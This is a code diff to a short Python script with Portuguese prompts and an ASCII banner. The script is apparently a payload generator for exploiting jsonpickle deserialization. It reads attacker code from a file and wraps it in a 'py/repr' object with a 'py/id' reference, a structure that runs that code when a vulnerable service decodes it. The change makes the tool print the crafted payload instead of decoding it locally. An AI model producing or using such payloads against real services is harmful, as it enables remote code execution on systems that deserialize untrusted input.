@@ -1,4 +1,4 @@
-import io, jsonpickle
+import io
 print('''
   __  __        ______ _   _                 
  |  \/  |      |  ____| | | |                
@@ -12,9 +12,9 @@ print('''
 ''')
 code = open(input('  [+] Informe o caminho do payload: '), 'r')
 try:
-  payload = '{"1": {"py/repr": code.read()}, "2": {"py/id": 67}}'
+  payload = '{"1": {"py/repr": %s}, "2": {"py/id": 67}}' %code.read()
 except:
   exit('  [!] Erro ao gerar payload!')
 print('\n   ====== Payload ======\n')
-print(jsonpickle.decode(payload))
+print(payload)
 print('\n   ====== Payload ======\n')
